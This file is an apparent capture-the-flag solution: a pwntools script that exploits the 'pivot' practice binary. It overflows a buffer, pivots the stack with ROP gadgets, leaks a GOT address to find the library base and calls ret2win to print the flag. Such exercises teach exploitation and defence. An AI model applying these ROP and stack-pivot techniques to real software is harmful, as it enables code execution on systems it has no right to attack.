from pwn import *
import binascii
import warnings
import struct
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './pivot'
elf = context.binary = ELF(exe, checksec=False)
library = './libpivot.so'
library_elf = context.binary = ELF(library, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', 'a')
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))
elf_puts_plt = elf.plt.puts
elf_fh_plt = elf.plt.foothold_function
elf_fh_got = elf.got.foothold_function
xchg_rax_rsp = 0x00000000004009bd
pop_rax = 0x00000000004009bb
pop_rdi = 0x0000000000400a33

fh_offset = int(str(library_elf.symbols.foothold_function),16)
ret2win_offset = int(str(library_elf.symbols.ret2win),16)

io = start()
io.recvuntil("Call ret2win() from libpivot")
pivot_addr = io.recvline_contains(b"The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(b' ', 1)[1]
pivot_addr = struct.pack("Q", int(str(pivot_addr.decode('utf-8')), 16))

rop_chain_1 = ROP(elf)
rop_chain_1.call(elf_fh_plt)
rop_chain_1.call(elf_puts_plt, [elf_fh_got])
rop_chain_1.call(elf.symbols.main)
rop_chain_1.chain()

payload_1 = flat(
rop_chain_1
)

rop_chain_2 = ROP(elf)
rop_chain_2.raw([pop_rax, pivot_addr, xchg_rax_rsp])
rop_chain_2.chain()

payload_2 = flat(
eip_offset * asm('nop'),
rop_chain_2
)

io.sendline(payload_1)
io.sendlineafter('> ', payload_2)

io.recvlines(5)
leaked_address = io.recvlines(1)[0]

foothold_leak = unpack(leaked_address[:len(leaked_address)].strip().ljust(8, b"\x00")) # same as u32, unpack bytes to hex string, don't need strip(). Take the whole payload
library_base = foothold_leak - library_elf.symbols.foothold_function
ret2win = library_base + library_elf.symbols.ret2win

payload_3 = flat(
asm('nop') * eip_offset,
ret2win
)

io.sendline(payload_3)

io.recvlines(10)
flag = io.recvline(1)
success(flag)

